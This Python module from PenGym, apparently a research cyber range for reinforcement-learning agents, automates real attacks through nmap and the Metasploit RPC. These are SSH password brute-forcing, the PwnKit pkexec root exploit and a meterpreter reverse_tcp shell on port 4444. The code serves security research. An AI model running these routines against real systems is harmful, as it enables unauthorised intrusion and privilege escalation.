
# Import libraries
import time
import logging

from nasim.envs.host_vector import HostVector
from nasim.envs.action import ActionResult
from nasim.envs.utils import AccessLevel
from pengym.storyboard import Storyboard
from pymetasploit3.msfrpc import MeterpreterSession, ShellSession

import pengym.utilities as utils

storyboard = Storyboard()

class PenGymHostVector(HostVector):
    """A Vector representation of a single host in PenGym derived from the NASim HostVector class

    Args:
        HostVector: HostVector Class from NASim
    """

    # Perform action (overrides super class function)
    def perform_action(self, action):
        """Perform given action on this host. This function overrides the perform_action() function in NASim HostVector.

        Args:
            action (Action): The action to perform

        Returns:
            PenGymHostVector: The resulting state of host after action
            ActionObervation: The result of the action
        """

        # Map host address to IP address
        host_ip_list = utils.map_host_address_to_IP_address(utils.host_map, self.address)

        # Get list of services in scenario
        scenario_services = utils.scenario.services

        # Get list of os in scenario
        scenario_os = utils.scenario.os

        # Get list of process in scenario
        scenario_processes = utils.scenario.processes

        # Reset the value of PenGym Error
        utils.PENGYM_ERROR = False

        # Get list of port/ports in the current host
        host_services_dict = utils.scenario.hosts[self.address].services
        ports = utils.map_dict_values_to_list(host_services_dict)

        # Set tags to differentiate between PenGym and NASim actions
        # only if both of them are enabled
        if utils.ENABLE_PENGYM and utils.ENABLE_NASIM:
            tag_pengym = storyboard.TAG_PENGYM
            tag_nasim = storyboard.TAG_NASIM
        else:
            tag_pengym = ""
            tag_nasim = ""

        ###########################################################################################
        ###########################################################################################
        # Execute actions by following the order in NASim host_vector.py
        # Copy the next state for future purposes
        next_state = self.copy()


        ###########################################################################################
        # Perform ServiceScan
        if action.is_service_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                service_dict = None

                service_dict = utils.host_map[self.address][storyboard.SERVICES]

                if (service_dict is None):
                    # Do service scan for each IP address of host
                    for host_ip in host_ip_list:
                        service_result = self.do_service_scan(host_ip, utils.nmap_scanner, ports)
                        if service_result:
                            # Transform to compatible NASim result format
                            service_dict = utils.map_result_list_to_dict(service_result, scenario_services)
                            utils.host_map[self.address][storyboard.SERVICES] = service_dict
                            break

                end = time.time()
                # Print the result of the PenGym action
                if service_dict:
                    result = ActionResult(True, services=service_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={service_dict} Execution Time: {end-start:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_service_scan(): {service_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                result = ActionResult(True, services=self.services) # NASim code: ActionResult(True, 0, services=self.services)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: services={result.services} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform OSScan
        if action.is_os_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                os_result_dict = None

                os_result_dict = utils.host_map[self.address][storyboard.OS]

                if (os_result_dict is None):
                    # Do OS scan for each IP address of host
                    for host_ip in host_ip_list:
                        os_result = self.do_os_scan(host_ip, utils.nmap_scanner, ports)
                        if (os_result):
                            # Transform to compatible Nasim result format
                            os_result_dict = utils.map_result_list_to_dict(os_result, scenario_os)
                            utils.host_map[self.address][storyboard.OS] = os_result_dict
                            break

                end = time.time()

                # Print the result of action of Pengym
                if os_result_dict:
                    result = ActionResult(True, os=os_result_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {end-start:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_os_scan(): {os_result}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                result = ActionResult(True, os=self.os) # NASim code: ActionResult(True, 0, os=self.os)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform Exploit
        if action.is_exploit():

            # PenGym execution
            if utils.ENABLE_PENGYM:

                start = time.time()

               # Get status of exploit shell and bridge in current host
                exploit_result = utils.host_map[self.address][storyboard.SHELL]
                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]

               # Execute the exploit if exploit status is None
                if (exploit_result is None):
                    for host_ip in host_ip_list:
                        exploit_result, access = self.do_exploit(host_ip)
                        if exploit_result:
                            # Save the shell
                            utils.host_map[self.address][storyboard.SHELL] = exploit_result
                            break
                else:
                    access = storyboard.USER

                end = time.time()

                # Update state and print the result
                if exploit_result:

                    # Update current access level in host_map if needed
                    host_access = utils.host_map[self.address][storyboard.ACCESS]
                    if (host_access < AccessLevel[access].value):
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)

                    # Check the bridge status and active bridge
                    if not bridge_up:
                        utils.activate_host_bridge(self.address)
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True

                    # Set parameters according to NASim code logic
                    value = 0.0
                    next_state.compromised = True
                    if not self.access == AccessLevel.ROOT:
                        # Ensure that a machine is not rewarded twice and access level does not decrease
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            value = self.value

                    # Get the services and OS of the current host
                    host_services = utils.host_map[self.address][storyboard.SERVICES]
                    host_os = utils.host_map[self.address][storyboard.OS]

                    result = ActionResult(True, value=value, services=host_services, os=host_os, access=access)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} services={result.services if result.services else None } os={result.os if result.os else None} Execution Time: {end-start:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_exploit(): exploit_result={exploit_result} access={access}")
                    result = ActionResult(False, undefined_error=True) # connection_error may be more appropriate
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM)

            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                next_state, result = super().perform_action(action)
                end = time.time()
                if result.success:
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} services={result.services} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    utils.print_failure(action, result, storyboard.NASIM)

            return next_state, result

        # Use NASim code logic to ensure that the following actions are only executed on host
        # if the correct access level has already been obtained
        if not (self.compromised and action.req_access <= self.access):
            result = ActionResult(False, 0, permission_error=True)
            return next_state, result


        ###########################################################################################
        # Perform ProcessScan
        if action.is_process_scan():

            # PenGym execution
            if utils.ENABLE_PENGYM:
                start = time.time()
                process_dict = dict()

                process_dict = utils.host_map[self.address][storyboard.PROCESSES]

                if (process_dict is None):
                    process_result = self.do_process_scan()
                    process_list = list()

                    if (process_result):
                        # Get list of running process of target host after scanning that compatibles with processes from scenario
                        for process in process_result:
                            for scenario_process_name in scenario_processes:
                                if scenario_process_name in process:
                                    process_list.append(scenario_process_name)

                        if (process_list):
                            # Transform to compatible Nasim result format
                            process_dict = utils.map_result_list_to_dict(process_list, scenario_processes)

                            utils.host_map[self.address][storyboard.PROCESSES] = process_dict

                end = time.time()

                # Print the result
                if process_dict:

                    # Get the access level of the current host
                    host_access = utils.host_map[self.address][storyboard.ACCESS]

                    result = ActionResult(True, access=host_access, processes=process_dict)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {end-start:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_process_scan(): {process_list}, Host map: {utils.host_map}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM)

            # NASim execution (NOTE: next_state is not modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                result = ActionResult(True, access=self.access, processes=self.processes) # NASim code: ActionResult(True, 0, access=self.access, processes=self.processes)
                end = time.time()
                print(f"  Host {self.address} Action '{action.name}' SUCCESS: processes={result.processes} access={AccessLevel(result.access)} Execution Time: {end-start:1.6f}{tag_nasim}")

            return next_state, result


        ###########################################################################################
        # Perform PrivilegeEscalation
        if action.is_privilege_escalation():

            # PenGym execution
            if utils.ENABLE_PENGYM:

                start = time.time()

                meterpreter = utils.host_map[self.address][storyboard.METERPRETER]
                bridge_up = utils.host_map[self.address][storyboard.BRIDGE_UP]

                if (meterpreter is None):
                    meterpreter, access = self.do_privilege_escalation(host_ip_list)
                    if meterpreter:
                        utils.host_map[self.address][storyboard.METERPRETER] = meterpreter    
                else:
                    access = storyboard.ROOT

                end = time.time()

                # Update state and print the result
                if meterpreter:

                    # Update current access level in host_map
                    host_access = utils.host_map[self.address][storyboard.ACCESS]

                    if (host_access < AccessLevel[access].value):
                        utils.host_map[self.address][storyboard.ACCESS] = float(AccessLevel[access].value)

                    # Check the bridge status and active bridge
                    if not bridge_up:
                        utils.activate_host_bridge(self.address)
                        utils.host_map[self.address][storyboard.BRIDGE_UP] = True

                    # Set parameters according to NASim code logic
                    value = 0.0
                    if not self.access == AccessLevel.ROOT:
                        # Ensure that a machine is not rewarded twice and access level does not decrease
                        next_state.access = action.access
                        if action.access == AccessLevel.ROOT:
                            value = self.value

                    # Get the processes and OS of the current host
                    host_processes = utils.host_map[self.address][storyboard.PROCESSES]
                    host_os = utils.host_map[self.address][storyboard.OS]

                    result = ActionResult(True, value=value, processes=host_processes, os=host_os, access=access)
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={result.access} processes={result.processes if result.processes else None } os={result.os if result.os else None} Execution Time: {end-start:1.6f}{tag_pengym}")
                else:
                    logging.warning(f"Result of do_privilege_escalation(): action_success={meterpreter} access_result={access}")
                    result = ActionResult(False, undefined_error=True)
                    utils.PENGYM_ERROR = True
                    utils.print_failure(action, result, storyboard.PENGYM)

            # NASim execution (NOTE: next_state IS modified)
            if utils.ENABLE_NASIM:
                start = time.time()
                next_state, result = super().perform_action(action)
                end = time.time()
                if result.success:
                    print(f"  Host {self.address} Action '{action.name}' SUCCESS: access={AccessLevel(result.access)} processes={result.processes} os={result.os} Execution Time: {end-start:1.6f}{tag_nasim}")
                else:
                    utils.print_failure(action, result, storyboard.NASIM)

            return next_state, result


        ###########################################################################################
        # Try to perform any unsupported actions (only happens if new actions are introduced in NASim)
        next_state, result = super().perform_action(action)
        logging.warning(f"Unsupported action '{action.name}': result={result}")
        return next_state, result


    ###################################################################################
    def copy(self):
        """Copy the state itself and cast to PenGymHostVector

        Returns:
            PenGymHostVector: State of this host
        """
        copyVector = super().copy()
        penGymVector = PenGymHostVector(copyVector.vector)
        return penGymVector

    ###################################################################################
    def parse_exploit_result(self, result):
        """Parse the results of the exploit and return the job id on success

        Args:
            result (dict) : result from executing module in metasploit

        Returns:
            job_id (str): index of job
        """

        JOB_ID_KEY = "job_id"
        ERROR_KEY = "error"
        ERROR_MESSAGE_KEY = "error_message"

        # Check for correct execution
        if JOB_ID_KEY in result:
            job_id = result[JOB_ID_KEY]
            if job_id is not None:
                return str(job_id) # Must return a string, not an int
            else:
                logging.warning(f"Execution failed: job id is '{job_id}'")
                return None

        # Check for errors
        elif ERROR_KEY in result and result[ERROR_KEY]:
            if ERROR_MESSAGE_KEY in result:
                logging.warning(f"Execution returned an error: {result[ERROR_MESSAGE_KEY]}")
            else:
                logging.warning(f"Execution returned an error")

        return None

    ###################################################################################
    def get_existed_shell_id(self, msfrpc, host):
        """Get existing shell id of the host in session list

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host (string): host ip address

        Returns:
            shell_id (string): shell id of current host
        """

        TYPE_KEY = "type"
        SHELL_VALUE = "shell" # Alternative value: "meterpreter"
        TARGET_HOST_KEY = "target_host"

        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and TARGET_HOST_KEY in session_details:
                if session_details[TYPE_KEY] == SHELL_VALUE:

                    if host == session_details[TARGET_HOST_KEY]:
                        return session_key

        return None

    ###################################################################################
    def get_existed_meterpreter_id(self, msfrpc, host):
        """Get existing meterpreter id of the host in session list

        Args:
            msfrpc (MsfRpcClient) : msfrpc client
            host (string): host ip address

        Returns:
            meterpreter_id (string): meterpreter id of current host
        """
        TYPE_KEY = "type"
        ROOT_LEVEL = "root"
        METERPRETER_VALUE = "meterpreter"
        TARGET_HOST_KEY = "target_host"
        SESSION_HOST_KEY = "session_host"
        INFO_KEY = "info"

        for session_key, session_details in msfrpc.sessions.list.items():
            if TYPE_KEY in session_details and TARGET_HOST_KEY in session_details:
                if session_details[TYPE_KEY] == METERPRETER_VALUE:
                    if (host == session_details[SESSION_HOST_KEY] or host in session_details[INFO_KEY]) and ROOT_LEVEL in session_details[INFO_KEY]:
                        return session_key

        return None

    ###################################################################################
    def get_access_level(self, shell):
        """Get access level of the current host

        Arguments
        ---------
        shell (ShellSession/MeterpreterSession) : shell session

        Returns
        -------
        access (string): access level of current host
        """

        WHOAMI_CMD = 'whoami'
        GET_UID_CMD = 'getuid'

        if (isinstance(shell, ShellSession)):
            shell.write(WHOAMI_CMD)
        elif (isinstance(shell, MeterpreterSession)):
            shell.write(GET_UID_CMD)

        response = shell.read()

        while (len(response) == 0):
            time.sleep(0.1)
            response = shell.read()

        if storyboard.ROOT.lower() in response:
            access = storyboard.ROOT
        else:
            access = storyboard.USER

        return access

    ###################################################################################
    def do_service_scan(self, host, nm, ports=False):
        """Perform the service scan

        Arguments
        ---------
        host (string) : host ip address that is used for service scan
        nm (NMap Scanner)
        ports (list): list required ports for scanning

        Returns
        -------
        services_name (list): list of service's name of current host
        """

        # Check port the existed of port
        # -Pn: Tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: Tells Nmap not to perform DNS resolution
        # -sS: Tells Nmap to use TCP SYN scanning
        # -T5: Nmap should use the most aggressive timing template

        SCAN = 'scan'
        UDP = 'udp'
        TCP = 'tcp'
        NAME = 'name'
        STATE = 'state'
        OPEN = 'open'
        ARGS = '-Pn -n -sS -T5'

        services_scan = list()
        services_name = list()

        if ports:
            for port in ports:
                service_scan = nm.scan(host, port, arguments=ARGS, sudo=True)
                services_scan.append(service_scan)
        else:
            service_scan = nm.scan(host, arguments=ARGS, sudo=True)
            services_scan.append(service_scan)

        for service_scan in services_scan:
            # Get the list of service from the service scan result
            for ip in service_scan[SCAN].keys():
                ip_dict = service_scan[SCAN][ip]

                if UDP in ip_dict:
                    for port_name in ip_dict[UDP]:
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[UDP][port_name][NAME]
                            services_name.append(service)

                if TCP in ip_dict:
                    for port_name in ip_dict[TCP]:
                        if ip_dict[TCP][port_name][STATE] == OPEN:
                            service = ip_dict[TCP][port_name][NAME]
                            services_name.append(service)

        return services_name

    ###################################################################################
    def do_os_scan(self, host, nm, ports=False):
        """Perform the service scan

        Arguments
        ---------
        host (string) : host ip address that is used for service scan
        nm (NMap Scanner)
        ports (list): list required ports for scanning

        Returns
        -------
        services_name (list): list of service's name of current host
        """

        # Check port the existed of port
        # -Pn: tells Nmap not to use ping to determine if the target is up
        # Nmap will do the requested scanning functions against every target IP specified, as if every one is active.
        # -n: tells Nmap not to perform DNS resolution. 
        # -O: tells Nmap to perform operating system detection
        # -T5: Nmap should use the most aggressive timing template

        SCAN = 'scan'
        OSMATCH = 'osmatch'
        NAME = 'name'
        ARGS = '-Pn -n -O -T5'

        os_scan_list = list()
        os_name = list()

        if ports:
            for port in ports:
                osscan = nm.scan(host, port, arguments=ARGS, sudo=True)
                os_scan_list.append(osscan)
        else:
            osscan = nm.scan(host, arguments=ARGS, sudo=True)
            os_scan_list.append(osscan)

        for osscan in os_scan_list:
            # Get the os list from os scan result
            for key in osscan[SCAN].keys():
                osmatch = osscan[SCAN][key][OSMATCH]
                if osmatch: 
                    os = osmatch[0][NAME]
                    os_type = os.split(' ',1)[0].lower()
                    os_name.append(os_type)

        return os_name

    ###################################################################################
    def do_exploit(self, host):
        """Do exploit on target host

        Arguments
        ---------
        host (string) : host ip address that is used for exploit

        Returns
        -------
        shell (ShellSession): shell session of current host
        access (string): access level after exploiting
        """

        msfrpc = utils.msfrpc_client
        if not msfrpc:
            print("None in not msfrpc")
            return None, None

        shell_id = None

        # Check whether shell already exists
        # Get shell id from msfrpc sessions list
        shell_id = self.get_existed_shell_id(msfrpc, host)

        # Get the shell and access level
        if shell_id:
            print(f"  Shell for host {host} already exists => reuse")
            shell = msfrpc.sessions.session(shell_id)
            return shell, storyboard.USER

        # Get information for e_ssh action
        ssh_account = utils.config_info[storyboard.CYBER_RANGE][storyboard.GUEST_SETTINGS][storyboard.TASKS][storyboard.ADD_ACCOUNT][storyboard.SSH]

        username = ssh_account[storyboard.ACCOUNT]
        pass_file = utils.config_info[storyboard.FILE_PATH][ssh_account[storyboard.PWD_FILE]]

        # Execute exploit module to create the shell
        exploit_ssh = msfrpc.modules.use('auxiliary','auxiliary/scanner/ssh/ssh_login') # This value is fixed for e_ssh action

        exploit_ssh[storyboard.RHOSTS]=host
        exploit_ssh[storyboard.USERNAME]= username
        exploit_ssh[storyboard.PASS_FILE]= pass_file
        exploit_ssh[storyboard.SSH_TIMEOUT] = 2

        result = exploit_ssh.execute()

        # Get the job id on success
        job_id = self.parse_exploit_result(result)

        if not job_id:
            print("None in not job_id")
            return None, None
        else:
            # Must wait until job completes to ensure the session is created
            while job_id in msfrpc.jobs.list:
                time.sleep(0.1)

        # Get shell id from msfrpc sesions list
        shell_id = self.get_existed_shell_id(msfrpc, host)

        # Get the access level
        if shell_id:
            shell = msfrpc.sessions.session(shell_id)
            access = self.get_access_level(shell)
            return shell, access
        else:
            logging.debug(f"Shell for host {host} could not be created")
            return None, None

    ###################################################################################
    def do_process_scan(self):
        """Do process scan on current host

        Returns
        -------
        process_list (list): list of current processes
        """

        PROCESS_SCAN_METER = 'ps'
        PROCESS_SCAN_SHELL = 'ps -ef'

        process_list = list()

        # Get the existed shell session from the target host
        session = utils.host_map[self.address][storyboard.METERPRETER]
        if session:
            session.write(PROCESS_SCAN_METER)
            response = session.read()

            while (len(response) == 0):
                time.sleep(1)
                response = session.read()
        else:
            session = utils.host_map[self.address][storyboard.SHELL]
            session.write(PROCESS_SCAN_SHELL)
            response = session.read()

            while (PROCESS_SCAN_SHELL not in response):
                time.sleep(1)
                response = session.read()

        process_list = response.split('\n')

        return process_list

    ###################################################################################
    def do_privilege_escalation(self, host_list):
        """Do privilege escalation on hosts in list
        Use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec module

        Arguments
        ---------
        host_list (list) : list of host that is used for do pe

        Returns
        -------
        metterpreter (MeterpreterSession): meterpreter session of current host
        access (string): access level after exploiting
        """

        msfrpc = utils.msfrpc_client
        if not msfrpc:
            print("* WARNING: MSF RPC client is not defined")
            return None, None

        meterpreter_id = None
        shell_id = None

        # Get shell id and meterpreter from msfrpc sessions list
        for host in host_list:
            if shell_id is None:
                shell_id = self.get_existed_shell_id(msfrpc, host)

            if meterpreter_id is None:
                meterpreter_id = self.get_existed_meterpreter_id(msfrpc, host)

                if meterpreter_id:
                    print(f" Meterpreter for host {host} already exists => resuse")

            if shell_id and meterpreter_id:
                break

        # Return None if shell was not created
        if shell_id is None:
            print("* WARNING: Privilege escalation shell could not be created")
            return None, None

        # Excute pe to get meterpreter
        if not meterpreter_id:

            # Gain root access
            # module, payload, lport values are fixed for pe_pkexec action
            exploit_pkexec = msfrpc.modules.use('exploit','linux/local/cve_2021_4034_pwnkit_lpe_pkexec')
            exploit_pkexec[storyboard.SESSION] = int(shell_id)
            exploit_pkexec[storyboard.AUTO_CHECK] = False

            payload = msfrpc.modules.use('payload', 'linux/x64/meterpreter/reverse_tcp')
            payload[storyboard.LHOST] = utils.config_info[storyboard.HOST_IP]
            payload[storyboard.LPORT] = 4444

            result = exploit_pkexec.execute(payload=payload)
            job_id = self.parse_exploit_result(result)

            if not job_id:
                print("* WARNING: Meterpreter job could not be created")
                return None, None
            else:
                flag = True # Stop when meterpreter is created or job is finished
                while flag:

                    # Get meterpreterr id from msfrpc sesions list
                    for host in host_list:
                        meterpreter_id = self.get_existed_meterpreter_id(msfrpc, host)
                        if meterpreter_id:
                            flag = False
                            break

                    if (job_id not in msfrpc.jobs.list):
                        print("* WARNING: Meterpreter job does not exist")
                        print(msfrpc.sessions.list)
                        flag = False
                        break

                    time.sleep(0.1)

            # Get the access level
            if meterpreter_id:
                meterpreter = msfrpc.sessions.session(meterpreter_id)
                access = self.get_access_level(meterpreter)
                return meterpreter, access
            else:
                logging.debug(f"Meterpreter for host {host} could not be created")
                print("* WARNING: Meterpreter shell could not be created")
                return None, None
        else:
            meterpreter = msfrpc.sessions.session(meterpreter_id)
            return meterpreter, storyboard.ROOT
